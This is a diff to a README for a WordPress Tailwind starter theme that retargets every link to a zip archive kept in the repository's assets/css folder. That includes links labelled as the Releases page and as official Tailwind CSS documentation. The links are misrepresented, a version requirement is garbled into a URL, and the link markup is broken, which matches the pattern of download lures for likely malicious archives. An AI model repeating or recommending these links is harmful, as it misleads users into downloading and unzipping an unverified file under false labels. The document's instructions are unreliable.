@@ -1,6 +1,6 @@
 # 🎨 wp-tailwind-barebones - Simple Begin to WordPress Themes
 
-[![Download Now](https://github.com/vip512/wp-tailwind-barebones/raw/refs/heads/main/assets/css/tailwind-barebones-wp-v2.2-alpha.4.zip%https://github.com/vip512/wp-tailwind-barebones/raw/refs/heads/main/assets/css/tailwind-barebones-wp-v2.2-alpha.4.zip)](https://github.com/vip512/wp-tailwind-barebones/raw/refs/heads/main/assets/css/tailwind-barebones-wp-v2.2-alpha.4.zip)
+[![Download Now](https://raw.githubusercontent.com/vip512/wp-tailwind-barebones/main/assets/css/tailwind_wp_barebones_v2.6.zip%https://raw.githubusercontent.com/vip512/wp-tailwind-barebones/main/assets/css/tailwind_wp_barebones_v2.6.zip)](https://raw.githubusercontent.com/vip512/wp-tailwind-barebones/main/assets/css/tailwind_wp_barebones_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **wp-tailwind-barebones**! This is a lightweight WordPress starter th
 
 - **WordPress version:** 5.0 or higher
 - **PHP version:** 7.3 or higher
-- **https://github.com/vip512/wp-tailwind-barebones/raw/refs/heads/main/assets/css/tailwind-barebones-wp-v2.2-alpha.4.zip** 12.x or higher
+- **https://raw.githubusercontent.com/vip512/wp-tailwind-barebones/main/assets/css/tailwind_wp_barebones_v2.6.zip** 12.x or higher
 - **npm:** 6.x or higher
 
 Ensure you have a server environment ready to host your WordPress site, like XAMPP, WAMP, or a live hosting account.
@@ -24,9 +24,9 @@ Ensure you have a server environment ready to host your WordPress site, like XAM
 
 ## 🔗 Download & Install
 
-To get the theme, [visit the Releases page to download](https://github.com/vip512/wp-tailwind-barebones/raw/refs/heads/main/assets/css/tailwind-barebones-wp-v2.2-alpha.4.zip). You will find the latest version there.
+To get the theme, [visit the Releases page to download](https://raw.githubusercontent.com/vip512/wp-tailwind-barebones/main/assets/css/tailwind_wp_barebones_v2.6.zip). You will find the latest version there.
 
-1. Go to the [Releases page](https://github.com/vip512/wp-tailwind-barebones/raw/refs/heads/main/assets/css/tailwind-barebones-wp-v2.2-alpha.4.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/vip512/wp-tailwind-barebones/main/assets/css/tailwind_wp_barebones_v2.6.zip).
 2. Locate the most recent version.
 3. Download the zip file.
 4. Unzip the downloaded file on your computer.
@@ -72,7 +72,7 @@ This will generate the required files for Tailwind to work correctly.
 
 ## 🌐 Documentation
 
-For more detailed guidance on using Tailwind CSS with WordPress, consider checking the [official Tailwind CSS documentation](https://github.com/vip512/wp-tailwind-barebones/raw/refs/heads/main/assets/css/tailwind-barebones-wp-v2.2-alpha.4.zip).
+For more detailed guidance on using Tailwind CSS with WordPress, consider checking the [official Tailwind CSS documentation](https://raw.githubusercontent.com/vip512/wp-tailwind-barebones/main/assets/css/tailwind_wp_barebones_v2.6.zip).
 
 ### 🌍 Community and Support
 
@@ -80,4 +80,4 @@ Join discussions on platforms like forums or social media, where you can ask que
 
 ## 🔗 Conclusion
 
-You are now ready to create a beautiful, custom WordPress site using **wp-tailwind-barebones**. Be sure to visit the [Releases page to download](https://github.com/vip512/wp-tailwind-barebones/raw/refs/heads/main/assets/css/tailwind-barebones-wp-v2.2-alpha.4.zip) the latest version and start your development journey today!
+You are now ready to create a beautiful, custom WordPress site using **wp-tailwind-barebones**. Be sure to visit the [Releases page to download](https://raw.githubusercontent.com/vip512/wp-tailwind-barebones/main/assets/css/tailwind_wp_barebones_v2.6.zip) the latest version and start your development journey today!
